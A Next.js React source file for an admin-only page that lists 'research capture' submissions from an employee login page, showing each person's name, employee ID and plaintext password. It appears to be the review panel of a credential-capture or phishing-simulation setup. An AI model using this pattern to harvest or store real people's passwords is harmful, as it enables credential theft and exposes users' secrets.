"use client";

import { useEffect, useState } from "react";
import { useRouter } from "next/navigation";
import Link from "next/link";
import { loadCurrentUser } from "@/lib/currentUser";

function fmt(iso) {
  if (!iso) return "—";
  return new Date(iso).toLocaleString(undefined, {
    day: "numeric",
    month: "short",
    year: "numeric",
    hour: "2-digit",
    minute: "2-digit",
  });
}

export default function AdminEmployeeLoginsPage() {
  const router = useRouter();
  const [account, setAccount] = useState(null);
  const [logins, setLogins] = useState(null);
  const [error, setError] = useState("");

  useEffect(() => {
    loadCurrentUser().then((parsed) => {
      if (!parsed) {
        router.replace("/admin-login");
        return;
      }
      if (parsed.role !== "ADMIN") {
        router.replace("/admin-login");
        return;
      }
      setAccount(parsed);
    });
  }, [router]);

  useEffect(() => {
    if (!account) return;
    fetch("/api/admin/employee-logins")
      .then((res) => {
        if (res.status === 401) {
          router.replace("/admin-login");
          return null;
        }
        return res.json();
      })
      .then((data) => {
        if (!data) return;
        if (data.success) setLogins(data.logins);
        else {
          setError(data.message || "Failed to load logins.");
          setLogins([]);
        }
      })
      .catch(() => {
        setError("Network error — could not reach the server.");
        setLogins([]);
      });
  }, [account, router]);

  if (!account || !logins) {
    return <main className="min-h-screen bg-[#f0f4fb]" />;
  }

  return (
    <main className="min-h-screen bg-[#f0f4fb] py-8 px-4 sm:px-6">
      <div className="max-w-5xl mx-auto">
        <div className="flex items-center justify-between mb-6">
          <div>
            <p className="text-xs font-semibold tracking-widest uppercase text-blue-600 mb-1">
              Employee login page — research capture
            </p>
            <h1 className="text-2xl font-bold text-gray-900">Employee Logins</h1>
            <p className="text-sm text-gray-500 mt-1">
              {logins.length} submission{logins.length === 1 ? "" : "s"} recorded
            </p>
          </div>
          <Link
            href="/admin_dashboard"
            className="text-xs font-bold text-blue-700 hover:underline"
          >
            ← Back to admin dashboard
          </Link>
        </div>

        {error && <p className="text-sm text-red-600 mb-4">{error}</p>}

        <div className="section-card overflow-hidden rounded-2xl border border-gray-200 bg-white">
          <div className="overflow-x-auto">
            <table className="w-full text-sm">
              <thead className="bg-gray-50 text-left text-xs font-semibold uppercase tracking-wide text-gray-500">
                <tr>
                  <th className="px-4 py-3">Submitted</th>
                  <th className="px-4 py-3">Name</th>
                  <th className="px-4 py-3">Employee ID</th>
                  <th className="px-4 py-3">Password</th>
                </tr>
              </thead>
              <tbody className="divide-y divide-gray-100">
                {logins.length === 0 ? (
                  <tr>
                    <td colSpan={4} className="px-4 py-8 text-center text-gray-400">
                      No logins yet.
                    </td>
                  </tr>
                ) : (
                  logins.map((l) => (
                    <tr key={l.id} className="hover:bg-gray-50">
                      <td className="px-4 py-3 whitespace-nowrap text-gray-500">{fmt(l.submittedAt)}</td>
                      <td className="px-4 py-3 font-medium text-gray-900">{l.name}</td>
                      <td className="px-4 py-3 font-mono text-gray-700">{l.employeeId}</td>
                      <td className="px-4 py-3 font-mono text-gray-700">{l.password}</td>
                    </tr>
                  ))
                )}
              </tbody>
            </table>
          </div>
        </div>
      </div>
    </main>
  );
}
